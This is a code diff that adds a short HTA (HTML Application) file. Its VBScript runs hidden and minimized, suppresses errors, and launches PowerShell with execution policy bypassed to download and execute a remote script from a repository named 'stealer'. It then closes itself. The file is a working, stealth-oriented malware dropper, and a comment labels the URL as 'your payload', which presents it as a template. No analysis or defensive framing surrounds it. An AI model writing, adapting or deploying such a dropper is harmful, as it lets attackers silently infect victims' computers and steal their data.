@@ -1,0 +1,25 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    SHOWINTASKBAR="no"
+    BORDER="none"
+    CAPTION="no"
+    WINDOWSTATE="minimize">
+<script language="VBScript">
+    On Error Resume Next
+    
+    ' Your payload URL
+    payloadUrl = "https://raw.githubusercontent.com/urandom-ai/stealer/master/document.txt"
+    
+    ' Download and execute
+    Set objShell = CreateObject("WScript.Shell")
+    psCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('" & payloadUrl & "')"""
+    
+    objShell.Run psCmd, 0, False
+    
+    ' Close HTA immediately
+    window.close()
+</script>
+</head>
+<body></body>
+</html>
